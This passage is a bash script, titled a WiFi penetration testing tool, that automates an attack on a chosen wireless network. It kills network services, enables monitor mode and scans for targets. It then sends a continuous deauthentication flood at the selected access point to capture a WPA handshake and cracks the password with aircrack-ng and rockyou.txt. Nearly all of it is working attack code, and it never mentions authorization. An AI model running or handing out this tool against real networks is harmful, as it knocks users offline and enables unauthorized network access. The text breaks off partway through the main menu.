#!/bin/bash

# WiFi Penetration Testing Automation Tool
RED=$'\033[0;31m'
GREEN=$'\033[0;32m'
YELLOW=$'\033[1;33m'
CYAN=$'\033[0;36m'
WHITE=$'\033[1;37m'
DARK=$'\033[0;37m'
BOLD=$'\033[1m'
NC=$'\033[0m'

banner() {
    clear
    echo -e "${GREEN}"
    echo "  ██╗    ██╗██╗███████╗██╗     ██████╗ ███████╗███╗   ██╗████████╗"
    echo "  ██║    ██║██║██╔════╝██║     ██╔══██╗██╔════╝████╗  ██║╚══██╔══╝"
    echo "  ██║ █╗ ██║██║█████╗  ██║     ██████╔╝█████╗  ██╔██╗ ██║   ██║   "
    echo "  ██║███╗██║██║██╔══╝  ██║     ██╔═══╝ ██╔══╝  ██║╚██╗██║   ██║   "
    echo -e "  ╚███╔███╔╝██║██║     ███████╗██║     ███████╗██║ ╚████║   ██║   "
    echo -e "   ╚══╝╚══╝ ╚═╝╚═╝     ╚══════╝╚═╝     ╚══════╝╚═╝  ╚═══╝   ╚═╝   ${NC}"
    local W=66
    local DASHES=$(printf '═%.0s' $(seq 1 $W))
    echo -e "${DARK}╔${DASHES}╗${NC}"
    echo -e "${DARK}║${NC}  ${RED}⚡${NC} ${WHITE}C A P T U R E   W I - F I   |   C R A C K   P A S S W O R D${NC}   ${DARK}║${NC}"
    echo -e "${DARK}║${NC}  ${RED}⚡${NC} ${YELLOW}S E T T I N G   U P   B R U T E F O R C E   A T T A C K${NC}       ${DARK}║${NC}"
    echo -e "${DARK}║${NC}  ${CYAN}🛡️${NC} ${GREEN}B Y   T E A M   U N I T - 6 1 3 9 8${NC}                          ${DARK}║${NC}"
    echo -e "${DARK}╚${DASHES}╝${NC}"
    echo ""
}

check_root() {
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}[!] This script must be run as root!${NC}"
        exit 1
    fi
}

setup_output_dir() {
    DESKTOP_DIR=$(eval echo ~$(logname 2>/dev/null || echo $SUDO_USER)/Desktop 2>/dev/null)
    if [[ ! -d "$DESKTOP_DIR" ]]; then
        DESKTOP_DIR=$(eval echo ~/Desktop)
    fi
    OUTPUT_DIR="$DESKTOP_DIR/WI-FI Pentest"
    if [[ ! -d "$OUTPUT_DIR" ]]; then
        mkdir -p "$OUTPUT_DIR"
        echo -e "${GREEN}[+] Created folder: $OUTPUT_DIR${NC}"
    fi
    echo -e "${YELLOW}[*] All files will be saved in: $OUTPUT_DIR${NC}"
    CAP_FILE_PATH="$OUTPUT_DIR"
}

select_interface() {
    echo -e "${YELLOW}[*] Detecting wireless interfaces...${NC}"
    IFS=$'\n' read -rd '' -a INTERFACES <<< "$(iwconfig 2>/dev/null | grep -o '^[^ ]*')"

    if [[ ${#INTERFACES[@]} -eq 0 ]]; then
        echo -e "${RED}[!] No wireless interfaces found${NC}"
        exit 1
    elif [[ ${#INTERFACES[@]} -eq 1 ]]; then
        echo -e "${GREEN}[+] Found 1 wireless interface: ${INTERFACES[0]}${NC}"
        read -rp "$(echo -e $CYAN)[?] Use ${INTERFACES[0]}? (Y/n): ${NC}" CONFIRM
        if [[ "$CONFIRM" == "n" || "$CONFIRM" == "N" ]]; then
            read -rp "$(echo -e $CYAN)[?] Enter wireless interface name manually: ${NC}" INTERFACE
        else
            INTERFACE="${INTERFACES[0]}"
        fi
    else
        echo -e "${YELLOW}[*] Multiple wireless interfaces found:${NC}"
        local idx=0
        for iface in "${INTERFACES[@]}"; do
            echo "  $((idx+1))) $iface"
            ((idx++))
        done
        echo ""
        read -rp "$(echo -e $CYAN)[?] Select interface number or enter name manually: ${NC}" CHOICE
        if [[ "$CHOICE" =~ ^[0-9]+$ ]] && (( CHOICE >= 1 && CHOICE <= ${#INTERFACES[@]} )); then
            INTERFACE="${INTERFACES[$((CHOICE-1))]}"
        else
            INTERFACE="$CHOICE"
        fi
    fi

    MON_INTERFACE="${INTERFACE}mon"
    echo -e "${GREEN}[+] Selected interface: $INTERFACE -> Monitor: $MON_INTERFACE${NC}"
}

kill_interfering() {
    echo -e "${YELLOW}[*] Killing interfering processes...${NC}"
    airmon-ng check kill
    systemctl stop NetworkManager 2>/dev/null
    systemctl stop wpa_supplicant 2>/dev/null
    echo -e "${GREEN}[+] Done${NC}"
}

enable_monitor() {
    echo -e "${YELLOW}[*] Enabling monitor mode on $INTERFACE...${NC}"
    airmon-ng start "$INTERFACE"
    sleep 2
    if ! iwconfig "$MON_INTERFACE" 2>/dev/null | grep -q "Mode:Monitor"; then
        echo -e "${YELLOW}[*] Retrying monitor mode...${NC}"
        airmon-ng start "$INTERFACE" 2>/dev/null
        sleep 2
    fi
    echo -e "${GREEN}[+] Monitor mode enabled: $MON_INTERFACE${NC}"
}

scan_networks() {
    local SCAN_DURATION=25
    local SCAN_FILE

    while true; do
        SCAN_FILE="/tmp/wifiscan_$(date +%s)"
        echo -e "${YELLOW}[*] Scanning for WiFi networks... (${SCAN_DURATION} seconds)${NC}"

        airodump-ng -w "$SCAN_FILE" --output-format csv "$MON_INTERFACE" > /dev/null 2>&1 &
        local SCAN_PID=$!

        local REMAINING=$SCAN_DURATION
        while [[ $REMAINING -gt 0 ]]; do
            echo -ne "\r    Time remaining: ${CYAN}${REMAINING}${NC} seconds    "
            sleep 1
            ((REMAINING--))
        done
        echo -ne "\r    Time remaining: ${CYAN}0${NC} seconds    \n"

        kill "$SCAN_PID" 2>/dev/null
        wait "$SCAN_PID" 2>/dev/null
        sleep 1

        echo -e "${GREEN}[+] Scan complete. Available networks:${NC}"
        local CSV_FILE="${SCAN_FILE}-01.csv"
        if [[ -f "$CSV_FILE" ]]; then
            awk -F',' 'NR>2 && $1 ~ /^[[:space:]]*[0-9A-Fa-f]{2}:/ {
                gsub(/^[[:space:]]+|[[:space:]]+$/, "", $1);
                gsub(/^[[:space:]]+|[[:space:]]+$/, "", $4);
                gsub(/^[[:space:]]+|[[:space:]]+$/, "", $14);
                if (length($1) == 17 && $14 != "") {
                    printf "  BSSID: %-20s Ch: %-3s ESSID: %s\n", $1, $4, $14;
                }
            }' "$CSV_FILE"
        fi

        echo ""
        read -rp "$(echo -e $CYAN)[?] Enter target BSSID to select, or press Enter to scan again (+10s): ${NC}" USER_BSSID

        if [[ -n "$USER_BSSID" ]]; then
            BSSID=$(echo "$USER_BSSID" | tr -d ' ' | tr '[:lower:]' '[:upper:]')
            if [[ -f "$CSV_FILE" ]]; then
                CHANNEL=$(awk -F',' -v bssid="$BSSID" 'NR>2 {gsub(/^[[:space:]]+|[[:space:]]+$/, "", $1); if (toupper($1) == toupper(bssid)) {gsub(/^[[:space:]]+|[[:space:]]+$/, "", $4); print $4; exit}}' "$CSV_FILE" | tr -d ' ')
            fi
            rm -f "${SCAN_FILE}"* 2>/dev/null
            break
        fi

        SCAN_DURATION=$((SCAN_DURATION + 10))
        rm -f "${SCAN_FILE}"* 2>/dev/null
        echo -e "${YELLOW}[*] Extending scan by 10 seconds (next: ${SCAN_DURATION}s)${NC}"
    done
}

scan_networks_terminal() {
    local SCAN_DURATION=25
    local SCAN_FILE
    local NOTIFY_FILE="/tmp/scan_done_$$"
    local SCAN_SCRIPT="/tmp/wifi_scan_$$.sh"

    while true; do
        SCAN_FILE="/tmp/wifiscan_$$"

        cat > "$SCAN_SCRIPT" << 'SCANEOF2'
#!/bin/bash
SCAN_FILE="$1"
MON="$2"
NOTIFY="$3"
DURATION="$4"

airodump-ng -w "$SCAN_FILE" --output-format csv "$MON" 2>/dev/null &
SCAN_PID=$!

for ((i=DURATION; i>0; i--)); do
    echo -ne "\rScanning... ${i}s remaining"
    sleep 1
done

kill $SCAN_PID 2>/dev/null
wait $SCAN_PID 2>/dev/null
touch "$NOTIFY"
SCANEOF2
        chmod +x "$SCAN_SCRIPT"

        local TERMINAL=$(detect_terminal)
        echo -e "${YELLOW}[*] Scanning for WiFi networks... (${SCAN_DURATION} seconds)${NC}"

        case "$TERMINAL" in
            gnome-terminal)
                gnome-terminal -- bash -c "\"$SCAN_SCRIPT\" \"$SCAN_FILE\" \"$MON_INTERFACE\" \"$NOTIFY_FILE\" \"$SCAN_DURATION\"" 2>/dev/null &
                ;;
            konsole)
                konsole --hold -e "$SCAN_SCRIPT" "$SCAN_FILE" "$MON_INTERFACE" "$NOTIFY_FILE" "$SCAN_DURATION" 2>/dev/null &
                ;;
            x-terminal-emulator|xterm|xfce4-terminal|lxterminal|mate-terminal|terminator|urxvt|rxvt)
                $TERMINAL -e "$SCAN_SCRIPT" "$SCAN_FILE" "$MON_INTERFACE" "$NOTIFY_FILE" "$SCAN_DURATION" 2>/dev/null &
                ;;
            *)
                bash "$SCAN_SCRIPT" "$SCAN_FILE" "$MON_INTERFACE" "$NOTIFY_FILE" "$SCAN_DURATION" &
                ;;
        esac

        while [[ ! -f "$NOTIFY_FILE" ]]; do
            sleep 1
        done

        echo -e "${GREEN}[+] Scan complete. Available networks:${NC}"
        local CSV_FILE="${SCAN_FILE}-01.csv"
        if [[ -f "$CSV_FILE" ]]; then
            awk -F',' 'NR>2 && $1 ~ /^[[:space:]]*[0-9A-Fa-f]{2}:/ {
                gsub(/^[[:space:]]+|[[:space:]]+$/, "", $1);
                gsub(/^[[:space:]]+|[[:space:]]+$/, "", $4);
                gsub(/^[[:space:]]+|[[:space:]]+$/, "", $14);
                if (length($1) == 17 && $14 != "") {
                    printf "  BSSID: %-20s Ch: %-3s ESSID: %s\n", $1, $4, $14;
                }
            }' "$CSV_FILE"
        fi

        echo ""
        read -rp "$(echo -e $CYAN)[?] Enter target BSSID to select, or press Enter to scan again (+10s): ${NC}" USER_BSSID

        if [[ -n "$USER_BSSID" ]]; then
            BSSID=$(echo "$USER_BSSID" | tr -d ' ' | tr '[:lower:]' '[:upper:]')
            if [[ -f "$CSV_FILE" ]]; then
                CHANNEL=$(awk -F',' -v bssid="$BSSID" 'NR>2 {gsub(/^[[:space:]]+|[[:space:]]+$/, "", $1); if (toupper($1) == toupper(bssid)) {gsub(/^[[:space:]]+|[[:space:]]+$/, "", $4); print $4; exit}}' "$CSV_FILE" | tr -d ' ')
            fi
            rm -f "${SCAN_FILE}"* "$NOTIFY_FILE" "$SCAN_SCRIPT" 2>/dev/null
            break
        fi

        SCAN_DURATION=$((SCAN_DURATION + 10))
        rm -f "${SCAN_FILE}"* "$NOTIFY_FILE" 2>/dev/null
        echo -e "${YELLOW}[*] Extending scan by 10 seconds (next: ${SCAN_DURATION}s)${NC}"
    done
}

list_existing_caps() {
    echo -e "${YELLOW}[*] Existing .cap files in $OUTPUT_DIR :${NC}"
    CAPS=$(ls "$OUTPUT_DIR"/*.cap 2>/dev/null | xargs -n1 basename 2>/dev/null)
    if [[ -z "$CAPS" ]]; then
        echo "  (no existing .cap files)"
    else
        echo "$CAPS" | sed 's/^/  - /'
    fi
    echo ""
}

generate_filename() {
    local base="$1"
    if [[ ! -f "${CAP_FILE_PATH}/${base}.cap" ]]; then
        echo "$base"
        return
    fi
    local counter=1
    while [[ -f "${CAP_FILE_PATH}/${base}-${counter}.cap" ]]; do
        ((counter++))
    done
    echo "${base}-${counter}"
}

set_target() {
    list_existing_caps

    if [[ -z "$BSSID" ]]; then
        read -rp "$(echo -e $CYAN)[?] Enter target BSSID (e.g., 00:11:22:33:44:55): ${NC}" BSSID
    fi
    if [[ -z "$CHANNEL" ]]; then
        read -rp "$(echo -e $CYAN)[?] Enter target channel: ${NC}" CHANNEL
    fi

    DEFAULT_NAME="capture"
    SUGGESTED=$(generate_filename "$DEFAULT_NAME")
    read -rp "$(echo -e $CYAN)[?] Enter capture file name [${SUGGESTED}]: ${NC}" CAP_INPUT
    if [[ -z "$CAP_INPUT" ]]; then
        CAP_INPUT="$SUGGESTED"
    fi

    FINAL_NAME=$(generate_filename "$CAP_INPUT")
    if [[ "$FINAL_NAME" != "$CAP_INPUT" ]]; then
        echo -e "${YELLOW}[!] '${CAP_INPUT}.cap' already exists. Using '${FINAL_NAME}.cap' instead.${NC}"
    fi

    CAP_FILE="${CAP_FILE_PATH}/${FINAL_NAME}"
}

detect_terminal() {
    if command -v x-terminal-emulator &>/dev/null; then
        echo "x-terminal-emulator"
    elif command -v gnome-terminal &>/dev/null; then
        echo "gnome-terminal"
    elif command -v xterm &>/dev/null; then
        echo "xterm"
    elif command -v xfce4-terminal &>/dev/null; then
        echo "xfce4-terminal"
    elif command -v konsole &>/dev/null; then
        echo "konsole"
    elif command -v lxterminal &>/dev/null; then
        echo "lxterminal"
    elif command -v mate-terminal &>/dev/null; then
        echo "mate-terminal"
    elif command -v terminator &>/dev/null; then
        echo "terminator"
    elif command -v urxvt &>/dev/null; then
        echo "urxvt"
    elif command -v rxvt &>/dev/null; then
        echo "rxvt"
    else
        echo "none"
    fi
}

capture_and_deauth() {
    local ERR_FILE="/tmp/wifi_err_$$"
    local PID_FILE="/tmp/wifi_pids_$$"
    local CAP_SCRIPT="/tmp/wifi_cap_$$.sh"

    cat > "$CAP_SCRIPT" << SCRIPTEOF
#!/bin/bash
BSSID="${BSSID}"
CHANNEL="${CHANNEL}"
MON="${MON_INTERFACE}"
CAP="${CAP_FILE}"
ERR="${ERR_FILE}"
PIDF="${PID_FILE}"
SCRIPTEOF
    cat >> "$CAP_SCRIPT" << 'SCRIPTEOF'
PATH="/usr/sbin:/sbin:$PATH"

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
CYAN='\033[0;36m'
NC='\033[0m'

clear
echo -e "${CYAN}╔══════════════════════════════════════════╗${NC}"
echo -e "${CYAN}║${NC}  ${RED}⚡${NC} HANDSHAKE CAPTURE IN PROGRESS ${RED}⚡${NC}  ${CYAN}║${NC}"
echo -e "${CYAN}╚══════════════════════════════════════════╝${NC}"
echo ""
echo -e "${YELLOW}[*]${NC} Target BSSID: ${GREEN}$BSSID${NC}"
echo -e "${YELLOW}[*]${NC} Channel:      ${GREEN}$CHANNEL${NC}"
echo -e "${YELLOW}[*]${NC} Interface:    ${GREEN}$MON${NC}"
echo -e "${YELLOW}[*]${NC} Output:       ${GREEN}${CAP}.cap${NC}"
echo ""

if ! iwconfig "$MON" 2>/dev/null | grep -q "Mode:Monitor"; then
    echo -e "${RED}[!] Monitor interface $MON not found!${NC}"
    sleep 3
    exit 1
fi

echo -e "${YELLOW}[*] Starting packet capture...${NC}"
airodump-ng -w "$CAP" -c "$CHANNEL" --bssid "$BSSID" "$MON" 2>"$ERR" &
AIDUMP_PID=$!

sleep 3

echo -e "${RED}[!] Sending continuous deauth packets...${NC}"
aireplay-ng --deauth 0 -a "$BSSID" "$MON" &
AIREPLAY_PID=$!

echo "$AIDUMP_PID" > "$PIDF"
echo "$AIREPLAY_PID" >> "$PIDF"

echo -e "${YELLOW}[*] Waiting for device to reconnect and capture WPA handshake...${NC}"
echo ""

while true; do
    if grep -q "WPA handshake" "$ERR" 2>/dev/null; then
        echo ""
        echo -e "${GREEN}[+] WPA HANDSHAKE CAPTURED SUCCESSFULLY!${NC}"
        echo ""
        kill $AIREPLAY_PID 2>/dev/null
        wait $AIREPLAY_PID 2>/dev/null
        kill $AIDUMP_PID 2>/dev/null
        wait $AIDUMP_PID 2>/dev/null
        rm -f "$ERR" "$PIDF"
        echo -e "${GREEN}[+] Deauth stopped. Devices can now reconnect.${NC}"
        echo -e "${GREEN}[+] Capture saved to: ${CAP}.cap${NC}"
        echo ""
        echo -e "${YELLOW}[*] You can close this window now.${NC}"
        sleep 5
        break
    fi
    sleep 1
done
SCRIPTEOF
    chmod +x "$CAP_SCRIPT"

    local TERMINAL=$(detect_terminal)

    case "$TERMINAL" in
        gnome-terminal)
            gnome-terminal -- bash -c "\"$CAP_SCRIPT\"" 2>/dev/null &
            ;;
        konsole)
            konsole --hold -e "$CAP_SCRIPT" 2>/dev/null &
            ;;
        x-terminal-emulator|xterm|xfce4-terminal|lxterminal|mate-terminal|terminator|urxvt|rxvt)
            $TERMINAL -e "$CAP_SCRIPT" 2>/dev/null &
            ;;
        *)
            echo -e "${YELLOW}[*] No GUI terminal found, installing xterm...${NC}"
            apt-get install -y xterm 2>/dev/null
            if command -v xterm &>/dev/null; then
                xterm -e "$CAP_SCRIPT" 2>/dev/null &
            else
                echo -e "${YELLOW}[*] Running capture in background instead...${NC}"
                bash "$CAP_SCRIPT" &
            fi
            ;;
    esac

    echo ""
    echo -e "${GREEN}[>]${NC} ${WHITE}A new terminal window has been opened.${NC}"
    echo -e "${GREEN}[>]${NC} ${WHITE}Check it for handshake capture progress.${NC}"
    echo -e "${GREEN}[>]${NC} ${WHITE}When the handshake is captured, press ENTER here to continue.${NC}"
    echo ""
    read -rp "$(printf "${GREEN}[${WHITE}ENTER${GREEN}]${NC} Press ENTER when handshake is captured: ")" CONFIRM

    if [[ -f "$PID_FILE" ]]; then
        while read PID; do
            kill "$PID" 2>/dev/null
            wait "$PID" 2>/dev/null
        done < "$PID_FILE"
        rm -f "$PID_FILE"
    fi
    rm -f "$CAP_SCRIPT" 2>/dev/null
    CAPTURE_FILE=$(ls -t "${CAP_FILE}"-*.cap 2>/dev/null | head -1)
    if [[ -z "$CAPTURE_FILE" ]]; then
        CAPTURE_FILE="${CAP_FILE}.cap"
    fi
    echo -e "${GREEN}[+] Continuing with captured handshake...${NC}"
    echo -e "${GREEN}[+] Capture file: ${WHITE}$(basename "$CAPTURE_FILE")${NC}"
}

stop_monitor() {
    echo -e "${YELLOW}[*] Stopping monitor mode...${NC}"
    airmon-ng stop "$MON_INTERFACE"
    echo -e "${GREEN}[+] Monitor mode stopped${NC}"
}

prepare_wordlist() {
    if [[ -z "$OUTPUT_DIR" ]]; then
        setup_output_dir
    fi

    local ROCKY_OUT="$OUTPUT_DIR/rockyou.txt"
    WORDLIST=""

    if [[ -f "$ROCKY_OUT" ]]; then
        echo -e "${GREEN}[+] Using existing: ${WHITE}$ROCKY_OUT${NC}"
        WORDLIST="$ROCKY_OUT"
        return
    fi

    local SEARCH_PATHS=(
        "/usr/share/wordlists/rockyou.txt.gz"
        "/usr/share/wordlists/rockyou.txt"
        "/usr/share/wordlists/rockyou.txt.tar.gz"
        "/usr/share/seclists/Passwords/Common-Credentials/rockyou.txt"
    )

    for SRC in "${SEARCH_PATHS[@]}"; do
        if [[ -f "$SRC" ]]; then
            echo -e "${YELLOW}[*] Found: ${WHITE}$SRC${NC}"
            if [[ "$SRC" == *.gz ]]; then
                echo -e "${YELLOW}[*] Extracting to output folder...${NC}"
                gzip -d -c "$SRC" > "$ROCKY_OUT" 2>/dev/null
            else
                cp "$SRC" "$ROCKY_OUT" 2>/dev/null
            fi
            if [[ -f "$ROCKY_OUT" ]]; then
                echo -e "${GREEN}[+] Wordlist ready: ${WHITE}$ROCKY_OUT${NC}"
                WORDLIST="$ROCKY_OUT"
                return
            fi
            break
        fi
    done

    echo -e "${YELLOW}[*] rockyou.txt not found. Attempting to install wordlists...${NC}"
    apt-get install -y wordlist 2>/dev/null || apt-get install -y seclists 2>/dev/null

    if [[ -f "/usr/share/wordlists/rockyou.txt.gz" ]]; then
        gzip -d -c "/usr/share/wordlists/rockyou.txt.gz" > "$ROCKY_OUT" 2>/dev/null
    elif [[ -f "/usr/share/wordlists/rockyou.txt" ]]; then
        cp "/usr/share/wordlists/rockyou.txt" "$ROCKY_OUT" 2>/dev/null
    fi

    if [[ -f "$ROCKY_OUT" ]]; then
        echo -e "${GREEN}[+] Wordlist ready: ${WHITE}$ROCKY_OUT${NC}"
        WORDLIST="$ROCKY_OUT"
    else
        echo -e "${RED}[!] Could not locate or install rockyou.txt${NC}"
        read -rp "$(echo -e $CYAN)[?] Enter path to wordlist manually: ${NC}" WORDLIST
    fi
}

bruteforce_crack() {
    echo ""
    echo -e "${RED}======================================================================${NC}"
    echo -e "${RED}  BRUTE FORCE: UNDER DEVELOPMENT${NC}"
    echo -e "${RED}  This feature is currently under development.${NC}"
    echo -e "${RED}  It will be available in a future update.${NC}"
    echo -e "${RED}======================================================================${NC}"
    echo ""
    read -rp "$(echo -e $CYAN)[?] Press Enter to continue...${NC}"
    return 1
}

crack_password() {
    if [[ -z "$WORDLIST" || ! -f "$WORDLIST" ]]; then
        echo -e "${RED}[!] No wordlist available. Run wordlist preparation first.${NC}"
        return 1
    fi

    if [[ -z "$CAPTURE_FILE" || ! -f "$CAPTURE_FILE" ]]; then
        CAPTURE_FILE=$(ls -t "$CAP_FILE_PATH"/*.cap 2>/dev/null | head -1)
    fi
    if [[ -z "$CAPTURE_FILE" || ! -f "$CAPTURE_FILE" ]]; then
        echo -e "${RED}[!] No .cap file found. Capture a handshake first.${NC}"
        return 1
    fi

    echo -e "${YELLOW}[*] Cracking WiFi password...${NC}"
    echo -e "${YELLOW}[*] Using capture: ${WHITE}$(basename "$CAPTURE_FILE")${NC}"
    echo -e "${YELLOW}[*] Using wordlist: ${WHITE}$WORDLIST${NC}"

    local CRACK_OUTPUT
    CRACK_OUTPUT=$(aircrack-ng "$CAPTURE_FILE" -w "$WORDLIST" 2>&1)
    echo "$CRACK_OUTPUT"

    if echo "$CRACK_OUTPUT" | grep -q "KEY FOUND"; then
        local FOUND_LINE
        FOUND_LINE=$(echo "$CRACK_OUTPUT" | grep "KEY FOUND" | head -1)
        echo ""
        echo -e "${GREEN}[+] ${FOUND_LINE}${NC}"
    else
        echo ""
        echo -e "${RED}[!] Password not found in wordlist${NC}"
    fi
}

crack_password_terminal() {
    if [[ -z "$WORDLIST" || ! -f "$WORDLIST" ]]; then
        echo -e "${RED}[!] No wordlist available. Run wordlist preparation first.${NC}"
        return 1
    fi

    if [[ -z "$CAPTURE_FILE" || ! -f "$CAPTURE_FILE" ]]; then
        CAPTURE_FILE=$(ls -t "$CAP_FILE_PATH"/*.cap 2>/dev/null | head -1)
    fi
    if [[ -z "$CAPTURE_FILE" || ! -f "$CAPTURE_FILE" ]]; then
        echo -e "${RED}[!] No .cap file found. Capture a handshake first.${NC}"
        return 1
    fi

    local CRACK_SCRIPT="/tmp/wifi_crack_$$.sh"
    local RESULT_FILE="/tmp/wifi_crack_result_$$"

    cat > "$CRACK_SCRIPT" << 'CRACKEOF'
#!/bin/bash
CAPTURE="$1"
WORDLIST="$2"
RESULT_FILE="$3"
ME="$4"
OUT_FILE="/tmp/crack_out_$$"

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
CYAN='\033[0;36m'
NC='\033[0m'

clear
echo -e "${CYAN}╔══════════════════════════════════════════╗${NC}"
echo -e "${CYAN}║${NC}  ${YELLOW}⚡${NC} PASSWORD CRACKING IN PROGRESS ${YELLOW}⚡${NC} ${CYAN}║${NC}"
echo -e "${CYAN}╚══════════════════════════════════════════╝${NC}"
echo ""
echo -e "${YELLOW}[*]${NC} Source:   ${GREEN}$CAPTURE${NC}"
echo -e "${YELLOW}[*]${NC} Wordlist: ${GREEN}$(basename "$WORDLIST")${NC}"
echo ""
echo -e "${YELLOW}[*] Press ${RED}q${YELLOW} + ENTER to stop${NC}"
echo ""

aircrack-ng "$CAPTURE" -w "$WORDLIST" > >(tee "$OUT_FILE") 2>&1 &
CRACK_PID=$!

while kill -0 $CRACK_PID 2>/dev/null; do
    read -t 1 -r -n 1 KEY < /dev/tty 2>/dev/null
    if [[ "$KEY" == "q" || "$KEY" == "Q" ]]; then
        kill $CRACK_PID 2>/dev/null
        wait $CRACK_PID 2>/dev/null
        echo ""
        echo -e "${RED}[!] Stopped by user.${NC}"
        echo "STOPPED" > "$RESULT_FILE"
        rm -f "$ME" "$OUT_FILE"
        sleep 2
        exit
    fi
done
wait $CRACK_PID 2>/dev/null
echo ""

if grep -q "KEY FOUND" "$OUT_FILE" 2>/dev/null; then
    FOUND=$(grep "KEY FOUND" "$OUT_FILE" | head -1)
    echo -e "${GREEN}[+] $FOUND${NC}"
    echo "FOUND" > "$RESULT_FILE"
else
    echo -e "${RED}[!] Password not found in wordlist${NC}"
    echo "NOT_FOUND" > "$RESULT_FILE"
fi

rm -f "$ME" "$OUT_FILE"
sleep 5
CRACKEOF
    chmod +x "$CRACK_SCRIPT"

    local TERMINAL=$(detect_terminal)

    case "$TERMINAL" in
        gnome-terminal)
            gnome-terminal -- bash -c "\"$CRACK_SCRIPT\" \"$CAPTURE_FILE\" \"$WORDLIST\" \"$RESULT_FILE\" \"$CRACK_SCRIPT\"" 2>/dev/null &
            ;;
        konsole)
            konsole --hold -e "$CRACK_SCRIPT" "$CAPTURE_FILE" "$WORDLIST" "$RESULT_FILE" "$CRACK_SCRIPT" 2>/dev/null &
            ;;
        x-terminal-emulator|xterm|xfce4-terminal|lxterminal|mate-terminal|terminator|urxvt|rxvt)
            $TERMINAL -e "$CRACK_SCRIPT" "$CAPTURE_FILE" "$WORDLIST" "$RESULT_FILE" "$CRACK_SCRIPT" 2>/dev/null &
            ;;
        *)
            echo -e "${YELLOW}[*] No GUI terminal found, installing xterm...${NC}"
            apt-get install -y xterm 2>/dev/null
            if command -v xterm &>/dev/null; then
                xterm -e "$CRACK_SCRIPT" "$CAPTURE_FILE" "$WORDLIST" "$RESULT_FILE" "$CRACK_SCRIPT" 2>/dev/null &
            else
                echo -e "${YELLOW}[*] Running crack in background...${NC}"
                bash "$CRACK_SCRIPT" "$CAPTURE_FILE" "$WORDLIST" "$RESULT_FILE" "$CRACK_SCRIPT" &
            fi
            ;;
    esac

    echo ""
    echo -e "${GREEN}[>]${NC} ${WHITE}A new terminal window has opened for password cracking.${NC}"
    echo -e "${GREEN}[>]${NC} ${WHITE}Watch the progress there.${NC}"
    echo -e "${GREEN}[>]${NC} ${WHITE}Press 'q' in that window to stop.${NC}"

    while [[ ! -f "$RESULT_FILE" ]]; do
        sleep 1
    done

    local RESULT=$(cat "$RESULT_FILE" 2>/dev/null)
    rm -f "$RESULT_FILE" "$CRACK_SCRIPT" 2>/dev/null

    if [[ "$RESULT" == "FOUND" ]]; then
        echo ""
        echo -e "${GREEN}[+] Password found! Press ENTER to continue.${NC}"
        read -rp "$(printf "${GREEN}[${WHITE}ENTER${GREEN}]${NC} Press ENTER to continue: ")" _
    elif [[ "$RESULT" == "STOPPED" ]]; then
        echo ""
        echo -e "${YELLOW}[*] Cracking was stopped by user.${NC}"
    else
        echo ""
        echo -e "${YELLOW}[*] Password not found in wordlist.${NC}"
    fi
}

restart_network() {
    echo -e "${YELLOW}[*] Cleaning up and restarting NetworkManager...${NC}"

    local MON_IFACES=()
    if [[ -n "$MON_INTERFACE" ]]; then
        MON_IFACES+=("$MON_INTERFACE")
    fi
    while read -r iface; do
        [[ -n "$iface" ]] && MON_IFACES+=("$iface")
    done < <(iwconfig 2>/dev/null | grep -o '^wl[^ ]*mon' | sort -u)

    for iface in "${MON_IFACES[@]}"; do
        echo -e "${YELLOW}[*] Stopping monitor: $iface${NC}"
        airmon-ng stop "$iface" 2>/dev/null
        iw dev "$iface" del 2>/dev/null
    done

    local ORIG=$(iwconfig 2>/dev/null | grep -o '^wl[^ ]*' | grep -v 'mon$' | head -1)
    if [[ -n "$ORIG" ]]; then
        ip link set "$ORIG" down 2>/dev/null
        ip link set "$ORIG" up 2>/dev/null
    fi

    airmon-ng check kill 2>/dev/null

    local TRIES=0
    systemctl restart NetworkManager 2>/dev/null &
    while ! systemctl is-active --quiet NetworkManager 2>/dev/null && [[ $TRIES -lt 10 ]]; do
        sleep 1
        ((TRIES++))
    done
    if systemctl is-active --quiet NetworkManager 2>/dev/null; then
        echo -e "${GREEN}[+] NetworkManager restarted${NC}"
    else
        systemctl start NetworkManager 2>/dev/null
        echo -e "${GREEN}[+] NetworkManager started${NC}"
    fi
}

# ============ MAIN MENU ============

main_menu() {
    while true; do
        banner
        echo -e "${DARK}┌──────────────────────────────────────────────────────────────┐${NC}"
        echo -e "${DARK}│${NC}  ${CYAN}SELECT ATTACK VECTOR${NC}                                         ${DARK}│${NC}"
        echo -e "${DARK}├──────────────────────────────────────────────────────────────┤${NC}"
        echo -e "${DARK}│${NC}  ${GREEN}[1]${NC}  FULL AUTO — Complete attack sequence              ${DARK}│${NC}"
        echo -e "${DARK}│${NC}  ${GREEN}[2]${NC}  ENABLE MONITOR MODE                               ${DARK}│${NC}"
        echo -e "${DARK}│${NC}  ${GREEN}[3]${NC}  SCAN NETWORKS                                     ${DARK}│${NC}"
        echo -e "${DARK}│${NC}  ${GREEN}[4]${NC}  CAPTURE HANDSHAKE — Set target & deauth           ${DARK}│${NC}"
        echo -e "${DARK}│${NC}  ${GREEN}[5]${NC}  CRACK PASSWORD                                    ${DARK}│${NC}"
        echo -e "${DARK}│${NC}  ${GREEN}[6]${NC}  CLEANUP — Stop monitor & restart network          ${DARK}│${NC}"
        echo -e "${DARK}│${NC}  ${GREEN}[7]${NC}  BRUTE FORCE (Under Development)                  ${DARK}│${NC}"
        echo -e "${DARK}│${NC}  ${RED}[8]${NC}  EXIT                                             ${DARK}│${NC}"
        echo -e "${DARK}└──────────────────────────────────────────────────────────────┘${NC}"
        echo ""
        echo -ne "${GREEN}[${WHITE}root${GREEN}@${RED}wifi-pwn${GREEN}]~# ${NC}"
        read CHOICE

        case $CHOICE in
            1)
                setup_output_dir
                select_interface
                kill_interfering
                enable_monitor
                scan_networks
                set_target
                capture_and_deauth
                restart_network
                prepare_wordlist
                crack_password_terminal
                echo -e "${GREEN}[+] Full automation complete${NC}"
                read -rp "Press Enter to continue..."
                ;;
            2)
                select_interface
                kill_interfering
                enable_monitor
                read -rp "Press Enter to continue..."
                ;;
            3)
                [[ -z "$MON_INTERFACE" ]] && { select_interface; kill_interfering; enable_monitor; }
                scan_networks
                read -rp "Press Enter to continue..."
                ;;
            4)
                setup_output_dir
                [[ -z "$MON_INTERFACE" ]] && select_interface
                set_target
                capture_and_deauth
                read -rp "Press Enter to continue..."
                ;;
            5)
                setup_output_dir
                list_existing_caps
